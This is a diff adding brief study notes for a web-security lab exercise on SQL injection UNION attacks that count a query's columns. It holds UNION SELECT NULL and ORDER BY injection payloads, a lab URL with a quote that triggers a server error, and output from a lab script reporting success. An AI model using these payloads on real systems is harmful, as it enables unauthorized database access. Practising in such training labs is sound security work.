@@ -1,0 +1,17 @@
+SQL injection UNION attack, determining the number of columns returned by the query
+
+END GOAL: Determine the number of columns
+
+Anlysis:
+
+UNION ATTACK: Number and order of columns are important to prevent evoking any error
+SELECT * FROM TABLE1 UNION SELECT NULL,NULL--
+
+ORDER BY CLAUSE: Order by nth column, if evokes error than n-1 number of columns are present 
+SELECT * FROM TABLE1 ORDER BY 1--
+
+https://ac711f2a1f87e9248077045d0049008b.web-security-academy.net/filter?category=' = Internal Server Error
+
+# script has only one parameter  
+python lab3.py "https://ac891f711fdce1c380df3caa000f0080.web-security-academy.net"
+[+] SQL Injection was successful 3
